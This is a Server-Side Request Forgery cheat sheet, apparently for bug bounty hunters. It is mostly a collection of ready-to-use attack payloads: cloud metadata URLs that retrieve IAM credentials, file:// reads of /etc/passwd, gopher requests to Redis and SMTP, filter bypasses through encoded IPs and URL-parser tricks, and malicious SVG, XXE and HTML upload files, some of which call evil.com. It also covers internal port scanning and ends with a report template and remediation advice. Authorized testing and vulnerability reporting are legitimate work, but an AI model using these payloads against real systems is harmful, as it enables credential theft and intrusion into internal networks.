# 🎯 SSRF Cheat Sheet 

> **Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.**

---

## 📍 WHERE TO FIND SSRF? (Recon Phase)

### 🔍 Look for these parameters in requests:

```
url, uri, link, target, dest, destination, page, path, site
file, feed, img, image, photo, avatar, picture, upload_url, download
proxy, host, domain, callback, webhook, resource, api_url, endpoint
reference_url, server, next, redir, redirect, return, returnTo, continue
metadata, aws_endpoint, gcp_url, azure_url
```

### 🔍 Look for these headers:

```
Referer ← Most Common!
X-Forwarded-For
X-Forwarded-Host
Origin 
Host
Forwarded-For
X-Real-IP 
X-Original-URL 
X-WAP-Profile
```

### 🔍 Look for these features in the app:

```
✅ Link Preview / Screenshot generation
✅ File upload from URL
✅ Webhook / Callback registration
✅ Image/Avatar import from external URL
✅ PDF/Report generation from web content
✅ Analytics that fetch Referer URLs
✅ "Test Connection" feature in admin panels
✅ Import/Export from external sources
✅ RSS feed reader, RSS parser
✅ URL shortener with preview
```

---

## 🕵️ HOW TO DISCOVER SSRF? (Testing Flow)

### Step 1: Basic Test

```bash
# Replace [PARAM] with the parameter name you found
# Replace [TARGET] with the vulnerable endpoint

# Test 1: External domain (confirm parameter works)
[TARGET]?[PARAM]=https://google.com

# Test 2: Internal localhost
[TARGET]?[PARAM]=http://127.0.0.1
[TARGET]?[PARAM]=http://localhost
[TARGET]?[PARAM]=http://0.0.0.0

# Test 3: Cloud metadata (AWS/GCP/Azure)
[TARGET]?[PARAM]=http://169.254.169.254/latest/meta-data/
[TARGET]?[PARAM]=http://metadata.google.internal/computeMetadata/v1/
[TARGET]?[PARAM]=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Step 2: Blind SSRF Detection (OAST)

```bash
# Use Burp Collaborator or interact.sh
# Generate a unique payload: your-id.burpcollaborator.net

[TARGET]?[PARAM]=http://your-id.burpcollaborator.net
[TARGET]?[PARAM]=http://your-id.burpcollaborator.net/test
[TARGET]?[PARAM]=http://your-id.burpcollaborator.net?data=ssrf-test

# Check Collaborator tab for:
✅ DNS interaction = Server tried to resolve domain
✅ HTTP interaction = Server made full request (SSRF confirmed!) 🎯
```

### Step 3: Time-Based Detection (If Blind)

```bash
# Compare response times for different targets

# Fast response (<1s) = Port closed / rejected
# Slow response (2-5s) = Port open / service responding
# Very slow (10s+) = Timeout / filtered

# Test with curl:
time curl "[TARGET]?[PARAM]=http://127.0.0.1:80"
time curl "[TARGET]?[PARAM]=http://127.0.0.1:9999"
time curl "[TARGET]?[PARAM]=http://192.168.1.10:80"
```

### Step 4: Port Scanning Internal Network

```bash
# Use Burp Intruder to scan 192.168.0.1-255 on port 8080
# Position: http://192.168.0.§1§:8080/admin
# Payload: Numbers, From:1, To:255, Step:1

# Watch for:
✅ Status code changes (200, 401, 403, 500)
✅ Response length differences
✅ Time differences
✅ Collaborator interactions
```

---

## 💥 SSRF PAYLOADS 

### 🎯 Basic Localhost Payloads

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://127.1
http://127.0.1
http://127.0.0.1.nip.io
http://localtest.me
http://spoofed.burpcollaborator.net
```

### 🎯 Cloud Metadata Payloads (AWS/GCP/Azure)

```bash
# AWS - Get hostname
http://169.254.169.254/latest/meta-data/local-hostname

# AWS - Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS - Get credentials (replace ROLE_NAME)
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# AWS - Get instance identity (contains keys!)
http://169.254.169.254/latest/dynamic/instance-identity/document

# AWS - Get user-data (may contain secrets)
http://169.254.169.254/latest/user-data

# GCP - Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 🎯 Protocol-Based Payloads

```bash
# Read local files
file:///etc/passwd
file:///C:/Windows/win.ini
file://\/\/etc/passwd

# Gopher protocol (powerful for TCP services)
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_CONFIG%20GET%20*
gopher://127.0.0.1:25/_HELO%20localhost%0D%0A

# Dict protocol
dict://127.0.0.1:6379/d:config:redis:1

# LDAP protocol
ldap://localhost:11211/%0astats%0aquit

# TFTP protocol
tftp://127.0.0.1:69/config.txt

# SFTP protocol
sftp://evil.com:2222/payload
```

### 🎯 File-Based SSRF Payloads (Upload Features)

```html
<!-- file.html - iframe SSRF -->
<body>
  <iframe src="http://169.254.169.254/latest/meta-data/" width="1" height="1"></iframe>
</body>

<!-- file.svg - external image fetch -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://evil.com/"></image>
</svg>

<!-- file.svg - XXE + SSRF combo -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- file.m3u - playlist SSRF -->
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
http://ssrfevil.com
#EXT-X-ENDLIST

<!-- file.svg - localhost via foreignObject -->
<svg width="6000" height="6000"><g>
  <foreignObject width="6000" height="6000">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="http://localhost/"></iframe>
    </body>
  </foreignObject>
</g></svg>
```

### 🎯 Header-Based SSRF Payloads

```http
# Referer header
Referer: http://127.0.0.1/admin
Referer: http://169.254.169.254/latest/meta-data/
Referer: http://your-id.burpcollaborator.net

# X-Forwarded-For header
X-Forwarded-For: http://127.0.0.1:8080

# Origin header
Origin: http://169.254.169.254
```

### 🎯 Full Path / Request Line SSRF

```http
# Basic absolute URL
GET https://burpcollab.net HTTP/1.1
Host: example.com

# Flask bypass with @
GET @burpcollab.net HTTP/1.1
Host: example.com

# Spring Boot bypass with ;@
GET ;@burpcollab.net HTTP/1.1
Host: example.com

# Direct AWS metadata via request line
GET @169.254.169.254 HTTP/1.1
Host: example.com
```

---

## 🔓 BYPASS TECHNIQUES (When Filters Block You)

### 🚫 Bypass: Localhost Blacklist

```bash
# Shortened IP
127.1
127.0.1
0.0.0.0
0

# Decimal representation
2130706433 = 127.0.0.1
3232235521 = 192.168.0.1
2852039166 = 169.254.169.254

# Octal representation
0177.0.0.1
0o177.0.0.1
q177.0.0.1

# Hex representation
0x7f000001
0xc0a80101
0xa9fea9fe

# IPv6 loopback
[::1]
[0000::1]
[::ffff:127.0.0.1]

# External DNS that resolves to localhost
127.0.0.1.nip.io
localtest.me
spoofed.burpcollaborator.net
```

### 🚫 Bypass: Whitelist Filters

```bash
# Using @ for credentials injection
https://allowed.com@evil.com/admin
https://trusted.net:fake@127.0.0.1:8080/admin

# Using # for fragment injection
https://evil.com#allowed.com/admin
https://127.0.0.1:8080/admin#trusted.com

# Using DNS hierarchy
https://allowed.com.evil.com/admin
https://trusted.net.malicious.io/path

# URL encoding
https://allowed.com/%61dmin  (%61 = a)
https://allowed.com/%2561dmin  (double encode)

# Double URL encoding for #
%2523 = # after double decode
http://localhost:80%2523@allowed.com/admin
```

### 🚫 Bypass: Open Redirect Chain

```bash
# If app has open redirect + SSRF whitelist
?param=http://allowed.com/redirect?url=http://127.0.0.1/admin

# Using r3dir service for testing
?param=https://307.r3dir.me/--to/?url=http://127.0.0.1/admin
```

### 🚫 Bypass: URL Parser Discrepancy

```bash
# Different parsers handle these differently:
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/  (missing //)
```

---

## 🧰 TOOLS YOU NEED

### 🔹 Essential Tools

```
✅ Burp Suite Professional
   - Repeater: Modify requests manually
   - Intruder: Scan ranges/ports automatically
   - Collaborator: Detect Blind SSRF via OOB

✅ Burp Extension: Collaborator Everywhere
   - Auto-injects Collaborator payload in all params/headers
   - Install: Extender → BApp Store → Search "Collaborator Everywhere"

✅ interact.sh (Free alternative to Collaborator)
   - https://interact.sh
   - Generate: curl https://interact.sh

✅ webhook.site (Quick HTTP testing)
   - https://webhook.site
   - Instant URL for receiving HTTP requests
```

### 🔹 Advanced Tools

```
✅ SSRFmap (Auto SSRF fuzzer)
   - https://github.com/swisskyrepo/SSRFmap
   - Usage: python3 ssrfmap.py -r request.txt -p url -m blind

✅ Gopherus (Generate Gopher payloads)
   - https://github.com/tarunkant/Gopherus
   - Usage: python3 gopherus.py --exploit → Choose service

✅ blind-ssrf-chains (Pre-built exploit chains)
   - https://github.com/assetnote/blind-ssrf-chains
   - Supports: Redis, Elasticsearch, Weblogic, Jenkins, Docker API

✅ ipfuscator (Generate alternative IP representations)
   - https://github.com/dwisiswant0/ipfuscator
   - Usage: ./ipfuscator 127.0.0.1
```

---

## 🎯 HOW TO BUILD A POC (Proof of Concept)

### ✅ POC Template for Report

```markdown
## SSRF Vulnerability - [Feature Name]

### Summary
The [feature] accepts user-controlled URLs without proper validation, allowing attackers to make the server fetch internal resources.

### Steps to Reproduce
1. Navigate to: [URL of vulnerable feature]
2. Intercept the request in Burp Suite
3. Modify the [PARAM] parameter to:
   ```
   [PARAM]=http://169.254.169.254/latest/meta-data/local-hostname
   ```
4. Send the request
5. Observe the response contains internal hostname: [value]

### Proof of Concept
```http
POST /api/v1/fetch HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/local-hostname
```

### Response
```http
HTTP/1.1 200 OK
Content-Type: text/plain

ip-10-0-1-45.ec2.internal
```

### Impact
- Access to AWS metadata service
- Potential credential theft (IAM keys)
- Internal network reconnaissance
- Possible RCE via chained vulnerabilities

### Remediation
1. Implement strict whitelist for allowed domains
2. Disable unnecessary protocols (file://, gopher://, etc.)
3. Block access to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.169.254)
4. Use a proxy layer to validate all outbound requests
5. Disable automatic redirect following or validate redirect targets

### ✅ Quick POC Checklist

```
[ ] Confirm parameter accepts external URL
[ ] Test localhost/127.0.0.1 access
[ ] Test cloud metadata endpoint
[ ] Try Blind SSRF with Collaborator
[ ] Document request/response with timestamps
[ ] Show impact (data leaked, service accessed)
[ ] Suggest clear remediation steps
```

---

## 🧠 ATTACK MINDSET (How Hackers Think)

### 🔍 Recon Questions to Ask:

```
❓ Does this feature fetch content from a URL I control?
❓ Can I change the destination of a server-side request?
❓ Does the app show the fetched content, or just "success/fail"?
❓ Are there headers I can manipulate that might be used server-side?
❓ Can I upload a file that contains external references?
```

### 🎯 Escalation Path:

```
1. Confirm SSRF exists (basic localhost test)
2. Identify what the server can reach (internal network scan)
3. Find sensitive services (Redis, MySQL, admin panels)
4. Extract valuable data (metadata, configs, credentials)
5. Chain with other bugs (XSS, RCE, auth bypass)
6. Document impact clearly for the report
```

### 💡 Pro Tips from Real Reports:

```
🔹 Always test cloud metadata endpoints first (169.254.169.254)
🔹 Use Collaborator for Blind SSRF - don't guess, measure!
🔹 Try multiple bypasses - filters often block only 1-2 techniques
🔹 Check Referer header - analytics software often fetches it
🔹 Test file uploads with SVG/HTML containing external URLs
🔹 Time-based detection works when you can't see responses
🔹 Combine SSRF with other bugs: XXE, Open Redirect, Shellshock
```

---

## 🚨 COMMON MISTAKES TO AVOID

```
❌ Testing only http:// - try file://, gopher://, dict:// too
❌ Assuming "no response = no vulnerability" - it might be Blind SSRF!
❌ Forgetting to check headers (Referer, X-Forwarded-For, etc.)
❌ Not trying bypass techniques when initial payload is blocked
❌ Testing only port 80 - scan common ports: 22, 443, 3306, 6379, 8080
❌ Ignoring time-based detection for Blind SSRF
❌ Not documenting the full impact chain in your report
```

---

## 📚 LEARN MORE (Resources)

```
🔗 PayloadsAllTheThings - SSRF Section
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

🔗 PortSwigger SSRF Labs (Free Practice)
   https://portswigger.net/web-security/ssrf

🔗 OWASP SSRF Guide
   https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

🔗 HackTricks SSRF Page
   https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
   
```

---

> 💡 **Final Tip**: SSRF is often a "gateway bug" - it opens doors to internal systems. Always ask: "What can this server reach that I can't?" That's where the real bugs hide. 🔐
